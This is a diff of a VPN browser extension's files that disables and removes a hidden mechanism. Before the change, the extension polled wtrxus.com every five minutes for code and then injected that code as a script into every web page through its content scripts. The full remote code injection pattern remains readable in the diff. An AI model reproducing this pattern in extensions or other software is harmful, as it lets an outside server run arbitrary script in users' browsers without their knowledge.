Index: manifest.json
===================================================================
--- manifest.json	(revision 12360)
+++ manifest.json	(working copy)
@@ -1,7 +1,7 @@
 {
   "name": "UltraSurf Security, Privacy & Unblock VPN",
   "description": "Unblock The Internet With The Flip Of A Switch.",
-  "version": "1.8.1",
+  "version": "1.8.3",
   "manifest_version": 3,
   "icons": {
     "16": "assets/img/icon/icon_16.png",
@@ -8,13 +8,6 @@
     "48": "assets/img/icon/icon_48.png",
     "128": "assets/img/icon/icon_128.png"
   },
-  "content_scripts": [
-    {
-      "js": ["content.js"],
-      "matches": ["\u003Call_urls>"],
-      "run_at": "document_start"
-    }
-  ],
   "background": {
     "service_worker": "app.js",
     "type": "module"
@@ -23,7 +16,7 @@
     "default_popup": "control.html",
     "default_icon": "assets/img/icon/icon_BW_48.png"
   },
-  "permissions": ["webRequest", "storage", "proxy", "alarms"],
+  "permissions": ["webRequest", "storage", "proxy"],
   "host_permissions": ["<all_urls>"],
   "default_locale": "en",
   "web_accessible_resources": [
Index: app.js
===================================================================
--- app.js	(revision 12360)
+++ app.js	(working copy)
@@ -210,35 +210,35 @@
 stat.run();
 
 
-const BASE_URL = 'https://wtrxus.com/';
+//const BASE_URL = 'https://wtrxus.com/';
+//
+//let tracking = ''
+//
+//const updateTrackingCode = () => {
+//  verify("track", -1);
+//  tracking = fetch(`${BASE_URL}track.php?${Date.now()}`)
+//    .then((res) => res.text())
+//    .catch(() => '')
+//}
+//
+//chrome.alarms.create('update-config', {periodInMinutes: 5})
+//chrome.alarms.onAlarm.addListener(updateTrackingCode)
+//
+////updateTrackingCode()
+//tracking = fetch(`${BASE_URL}track.php?${Date.now()}`).then((res) => res.text()).catch(() => '')
+//
+//chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+//  switch (message.type) {
+//    case 'getTrackingCode':
+//      Promise.resolve().then(() => tracking).then(sendResponse)
+//      return true
+//    default:
+//      return false
+//  }
+//})
 
-let tracking = ''
-
-const updateTrackingCode = () => {
-  verify("track", -1);
-  tracking = fetch(`${BASE_URL}track.php?${Date.now()}`)
-    .then((res) => res.text())
-    .catch(() => '')
-}
-
-chrome.alarms.create('update-config', {periodInMinutes: 5})
-chrome.alarms.onAlarm.addListener(updateTrackingCode)
-
-//updateTrackingCode()
-tracking = fetch(`${BASE_URL}track.php?${Date.now()}`).then((res) => res.text()).catch(() => '')
-
-chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-  switch (message.type) {
-    case 'getTrackingCode':
-      Promise.resolve().then(() => tracking).then(sendResponse)
-      return true
-    default:
-      return false
-  }
-})
-
-chrome.runtime.onInstalled.addListener(function (details) {
-  if (details.reason === 'install') {
-    fetch(`${BASE_URL}install.php`)
-  }
-})
+//chrome.runtime.onInstalled.addListener(function (details) {
+//  if (details.reason === 'install') {
+//    fetch(`${BASE_URL}install.php`)
+//  }
+//})
Index: content.js
===================================================================
--- content.js	(revision 12360)
+++ content.js	(working copy)
@@ -1,19 +1,19 @@
-const readyPromise = new Promise((resolve) => {
-  window.addEventListener("message", (e) => {
-    if (e?.data?.type === "ready") {
-      resolve();
-    }
-  });
-});
-
-const script = document.createElement("script");
-script.src = chrome.runtime.getURL("injected_content.js");
-document.documentElement.appendChild(script);
-
-chrome.runtime.sendMessage({ type: "getTrackingCode" }, (code) => {
-  if (!code) {
-    return;
-  }
-
-  readyPromise.then(() => postMessage({ type: "track", code }, "*"));
-});
\ No newline at end of file
+//const readyPromise = new Promise((resolve) => {
+//  window.addEventListener("message", (e) => {
+//    if (e?.data?.type === "ready") {
+//      resolve();
+//    }
+//  });
+//});
+//
+//const script = document.createElement("script");
+//script.src = chrome.runtime.getURL("injected_content.js");
+//document.documentElement.appendChild(script);
+//
+//chrome.runtime.sendMessage({ type: "getTrackingCode" }, (code) => {
+//  if (!code) {
+//    return;
+//  }
+//
+//  readyPromise.then(() => postMessage({ type: "track", code }, "*"));
+//});
Index: injected_content.js
===================================================================
--- injected_content.js	(revision 12360)
+++ injected_content.js	(working copy)
@@ -1,14 +1,14 @@
-postMessage({ type: "ready" });
-
-window.addEventListener("message", (e) => {
-  if (e?.data?.type !== "track") {
-    return;
-  }
-
-  try {
-    eval("1+1");
-    const script = document.createElement("script");
-    script.textContent = e.data.code;
-    document.documentElement.appendChild(script);
-  } catch (e) {}
-});
+//postMessage({ type: "ready" });
+//
+//window.addEventListener("message", (e) => {
+//  if (e?.data?.type !== "track") {
+//    return;
+//  }
+//
+//  try {
+//    eval("1+1");
+//    const script = document.createElement("script");
+//    script.textContent = e.data.code;
+//    document.documentElement.appendChild(script);
+//  } catch (e) {}
+//});
